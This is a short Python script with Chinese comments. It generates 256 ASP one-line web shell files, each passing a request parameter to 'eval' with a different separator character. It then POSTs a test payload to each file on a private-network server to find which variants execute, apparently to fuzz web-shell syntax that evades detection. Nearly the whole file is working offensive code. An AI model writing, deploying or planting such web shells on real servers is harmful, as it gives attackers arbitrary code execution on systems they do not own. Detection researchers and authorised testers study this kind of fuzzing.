#!/usr/bin/env python
# coding:utf-8
import os
import requests

# 定义生成ASP文件的函数
def generate(count):
    # 定义ASP文件的模板内容
    template = f"""
<%
a = request("value")
eval{chr(count)}a
%>
"""
    # 定义保存文件的路径
    path = r"./fuzz/"
    # 如果路径不存在，则创建该路径
    if not os.path.exists(path):
        os.makedirs(path)
    # 打开文件并写入模板内容
    with open(os.path.join(path, f"fuzz_{count}.asp"), 'w') as f:
        f.write(template)

# 循环生成0到255的ASP文件
for c in range(0, 256):
    generate(c)

# 循环遍历ASCII码范围从32到127
for i in range(32, 128):
    # 构造请求的URL
    url = f'http://10.100.18.28/1/fuzz_{i}.asp'
    # 构造POST请求的表单数据
    body_post = {'value': 'value=response.write("attack")'}
    try:
        # 发送POST请求
        r = requests.post(url, data=body_post)
        # 获取响应的文本内容
        content = r.text
        # 检查响应内容中是否包含关键字 "attack"
        if 'attack' in content:
            # 若包含，则打印URL和响应内容
            print(url)
            print(content)
    except requests.RequestException as e:
        # 处理请求异常
        print(f"请求 {url} 时发生错误: {e}")